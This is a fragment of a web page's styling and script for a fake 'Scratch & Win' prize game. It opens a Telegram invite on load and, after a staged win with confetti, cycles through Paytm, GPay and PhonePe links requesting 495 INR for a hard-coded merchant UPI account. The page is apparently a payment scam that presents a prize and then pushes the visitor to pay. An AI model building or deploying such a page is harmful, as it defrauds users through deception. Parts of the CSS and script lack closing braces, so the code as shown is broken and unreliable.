      padding: 0 20px;
      animation: glow 1.5s ease-in-out infinite alternate;
    }

    h1:before {
      content: "";
      position: absolute;
      top: -10px;
      left: -10px;
      right: -10px;
      bottom: -10px;
      background: linear-gradient(
        45deg,
        #ff00aa 0%,
        #ff00aa 20%,
        transparent 50%,
        #ff00aa 80%,
        #ff00aa 100%
      );
      background-size: 200% 100%;
      z-index: -1;
      border-radius: 15px;
      animation: shine 3s linear infinite;
      opacity: 0.7;
      filter: blur(15px);
    }

    h1:after {
      content: "";
      position: absolute;
      top: 0;
      left: 0;
      width: 30%;
      height: 100%;
      background: linear-gradient(
        to right,
        rgba(255,255,255,0) 0%,
        rgba(255,255,255,0.8) 50%,
        rgba(255,255,255,0) 100%
      );
      transform: skewX(-20deg);
      animation: reflection 3s infinite;
    }

    @keyframes glow {

      100% { text-shadow: 0 0 20px #ff00aa, 0 0 30px #ff00aa, 0 0 40px #ff00aa; }
    }

    @keyframes shine {
      0% { background-position: 200% 0; }
      100% { background-position: -200% 0; }

    @keyframes reflection {
      0% { left: -30%; }
      40% { left: 120%; }

  <script>
    // Force open Telegram app (fallback to link)
    function openTelegram() {
      window.location.href = "tg://join?invite=yanMwI6iw3hjNDll";
      setTimeout(() => {
        window.location.href = "https://t.me/+yanMwI6iw3hjNDll";

    }

    // Auto redirect after 2 seconds
    window.onload = function () {
      setTimeout(openTelegram, 2000);
      
      // Preload scratch card images
      const preloadImages = [
        "https://i.ibb.co/nNCT43nb/IMG-1114.jpg",
        "https://i.ibb.co/9m8Y3s3R/IMG-1116.png",
        "https://i.ibb.co/0RrqgRTj/IMG-1120.jpg",
        "https://i.ibb.co/nqr14xB9/IMG-1113.jpg"
      ];
      
      preloadImages.forEach(img => {
        new Image().src = img;
      });
    };
    
    // Scratch & Win functionality
    const scratchBtn = document.getElementById('scratchBtn');
    const scratchModal = document.getElementById('scratchModal');
    const closeScratch = document.getElementById('closeScratch');
    const resultModal = document.getElementById('resultModal');
    const winSound = document.getElementById('winSound');
    
    // Open scratch modal
    scratchBtn.addEventListener('click', function() {
      scratchModal.style.display = 'block';
      initScratchCard();
    });
    
    // Close scratch modal
    closeScratch.addEventListener('click', function() {
      scratchModal.style.display = 'none';
    });
    
    // Initialize scratch card
    function initScratchCard() {
      const canvas = document.getElementById('scratchCanvas');
      const ctx = canvas.getContext('2d');
      const container = document.querySelector('.card-container');
      const rewardImage = document.getElementById('rewardImage');
      const rewardAmount = document.getElementById('rewardAmount');
      const scratchText = document.getElementById('scratchText');
      
      // Set canvas size
      function resizeCanvas() {
        canvas.width = container.offsetWidth;
        canvas.height = container.offsetHeight;
        initScratchLayer();
      }
      
      // Initialize scratch layer
      function initScratchLayer() {
        const scratchLayer = new Image();
        scratchLayer.crossOrigin = "anonymous";
        scratchLayer.src = "https://i.ibb.co/nqr14xB9/IMG-1113.jpg";
        scratchLayer.onload = () => {
          ctx.globalCompositeOperation = "source-over";
          ctx.drawImage(scratchLayer, 0, 0, canvas.width, canvas.height);
        };
        scratchLayer.onerror = () => {
          // Fallback if scratch layer fails to load
          ctx.fillStyle = "#cccccc";
          ctx.fillRect(0, 0, canvas.width, canvas.height);
          ctx.fillStyle = "#999999";
          ctx.font = "20px Arial";
          ctx.textAlign = "center";
          ctx.fillText("Scratch here to reveal", canvas.width/2, canvas.height/2);
        };
      }
      
      let isDrawing = false, revealed = false, lastX = 0, lastY = 0;
      
      function getPosition(e) {
        const rect = canvas.getBoundingClientRect();
        const x = (e.touches ? e.touches[0].clientX : e.clientX) - rect.left;
        const y = (e.touches ? e.touches[0].clientY : e.clientY) - rect.top;
        return { x, y };
      }
      
      function startScratch(x, y) {
        isDrawing = true;
        lastX = x;
        lastY = y;
        scratch(x, y, true);
        try {
          winSound.play().catch(e => console.log("Audio play failed:", e));
        } catch (e) {
          console.log("Audio error:", e);
        }
      }
      
      function scratch(x, y, start = false) {
        if (!ctx) return;
        
        ctx.globalCompositeOperation = "destination-out";
        ctx.lineCap = "round";
        ctx.lineJoin = "round";
        ctx.lineWidth = 40;
        ctx.beginPath();
        if (start) ctx.moveTo(x, y);
        else {
          ctx.moveTo(lastX, lastY);
          ctx.lineTo(x, y);
          ctx.stroke();
        }
        lastX = x;
        lastY = y;
      }
      
      function getScratchedPercent() {
        if (!ctx) return 0;
        
        const imgData = ctx.getImageData(0, 0, canvas.width, canvas.height);
        let cleared = 0;
        for (let i = 3; i < imgData.data.length; i += 4) {
          if (imgData.data[i] < 128) cleared++;
        }
        return (cleared / (imgData.data.length / 4)) * 100;
      }
      
      function checkReveal() {
        if (revealed || getScratchedPercent() < 30) return;
        revealed = true;
        canvas.classList.add("hidden");
        scratchText.classList.add("hidden");
        rewardImage.classList.remove("hidden");
        rewardAmount.classList.remove("hidden");
        
        try {
          winSound.play().catch(e => console.log("Audio play failed:", e));
        } catch (e) {
          console.log("Audio error:", e);
        }
        
        confetti({ particleCount: 200, spread: 70, origin: { y: 0.6 } });
        
        setTimeout(() => {
          resultModal.classList.add("show");
          setTimeout(() => tryRedirectUPI(), 2000);
        }, 1000);
      }
      
      function tryRedirectUPI() {
        const pa = "g1g4822917.rzp@icici";
        const pn = "G1G4";
        const tr = "RZPQhptbTHPKvHtK8qrv2";
        const tn = "ScratchWin";
        const am = "495";
        const cu = "INR";
        
        const urls = [
          `paytmmp://pay?pa=${pa}&pn=${pn}&tr=${tr}&tn=${tn}&am=${am}&cu=${cu}`,
          `gpay://upi/pay?pa=${pa}&pn=${pn}&tr=${tr}&tn=${tn}&am=${am}&cu=${cu}`,
          `phonepe://pay?pa=${pa}&pn=${pn}&tr=${tr}&tn=${tn}&am=${am}&cu=${cu}`
        ];
        
        let index = 0;
        
        function tryNext() {
          if (index >= urls.length) return;
          window.location.href = urls[index];
          index++;
          setTimeout(tryNext, 800);
        }
        
        tryNext();
      }
      
      // Event listeners
      canvas.addEventListener("mousedown", e => startScratch(...Object.values(getPosition(e))));
      canvas.addEventListener("mousemove", e => { if (!isDrawing) return; scratch(...Object.values(getPosition(e))); checkReveal(); });
      canvas.addEventListener("mouseup", () => isDrawing = false);
      canvas.addEventListener("mouseleave", () => isDrawing = false);
      canvas.addEventListener("touchstart", e => startScratch(...Object.values(getPosition(e))));
      canvas.addEventListener("touchmove", e => { if (!isDrawing) return; scratch(...Object.values(getPosition(e))); checkReveal(); e.preventDefault(); });
      canvas.addEventListener("touchend", () => isDrawing = false);
      
      // Initialize
      resizeCanvas();
      window.addEventListener('resize', resizeCanvas);
    }
  </script>
